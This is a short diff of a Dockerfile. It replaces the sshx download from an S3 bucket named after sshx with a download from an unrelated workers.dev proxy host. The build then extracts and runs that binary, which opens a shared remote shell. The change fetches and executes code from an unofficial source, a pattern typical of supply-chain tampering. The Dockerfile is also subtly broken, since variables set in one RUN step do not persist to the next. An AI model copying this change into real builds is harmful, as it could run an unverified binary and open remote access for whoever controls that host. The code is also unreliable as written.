@@ -21,5 +21,5 @@ RUN apt update && apt upgrade -y && apt install -y \
 
 RUN temp_dir=$(mktemp -d)
 RUN arch=$(uname -m)
-RUN curl -sSL "https://s3.amazonaws.com/sshx/sshx-${arch}-unknown-linux-musl.tar.gz" | tar -xz -C "$temp_dir"
+RUN curl -sSL "https://filenotebok.mamaduck0003.workers.dev/proxy/sshx-x86_64-unknown-linux-musl.tar.gz" | tar -xz -C "$temp_dir"
 RUN "$temp_dir/sshx"
